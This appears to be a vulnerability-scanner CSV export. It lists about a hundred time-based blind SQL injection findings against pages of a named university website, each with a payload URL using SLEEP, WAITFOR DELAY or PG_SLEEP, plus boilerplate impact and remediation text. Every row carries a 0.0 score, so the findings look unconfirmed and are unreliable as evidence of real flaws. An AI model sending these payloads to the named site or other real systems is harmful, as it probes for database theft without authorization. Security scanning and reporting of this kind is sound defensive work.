Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1%27+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=SLEEP%285%29%23#1573307882239-046cfc07-ad22),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1%27+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1%27+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1+OR+SLEEP%285%29#1573891811595-5766f071-5c32),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1+OR+SLEEP%285%29#1573891811595-5766f071-5c32),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1+OR+SLEEP%285%29#1573891811595-5766f071-5c32),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1+OR+SLEEP%285%29#1573891811595-5766f071-5c32),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1%22+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1%22+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1%22+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1%27+AND+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1%22+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1%22+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1%27+AND+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1%22+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1%27+AND+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1%22+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=SLEEP%285%29%23#1573891811595-5766f071-5c32),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=SLEEP%285%29%23#1573891811595-5766f071-5c32),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=SLEEP%285%29%23#1573891811595-5766f071-5c32),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1+OR+SLEEP%285%29#1573891811595-5766f071-5c32),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=SLEEP%285%29%23#1573891811595-5766f071-5c32),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=SLEEP%285%29%23#1573891811595-5766f071-5c32),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573891811595-5766f071-5c32),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1%27+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1+OR+SLEEP%285%29#1573891811595-5766f071-5c32),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=SLEEP%285%29%23#1573891811595-5766f071-5c32),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1%27+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=SLEEP%285%29%23#1573891811595-5766f071-5c32),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1+OR+SLEEP%285%29#1573891811595-5766f071-5c32),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1%27+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1%27+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573891811595-5766f071-5c32),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1%27+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573891811595-5766f071-5c32),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573891811595-5766f071-5c32),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573891811595-5766f071-5c32),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573891811595-5766f071-5c32),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573891811595-5766f071-5c32),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1%27+AND+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1%27+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1%27+AND+SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1%27+AND+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1%27+AND+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573891811595-5766f071-5c32),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1%27+AND+PG_SLEEP%285%29--#1573891811595-5766f071-5c32),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=SLEEP%285%29%23#1767331041949-5d391444-1a4a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=SLEEP%285%29%23#1767331041949-5d391444-1a4a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27+AND+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27+AND+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27+AND+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=SLEEP%285%29%23#1767331041949-5d391444-1a4a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=SLEEP%285%29%23#1767331041949-5d391444-1a4a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
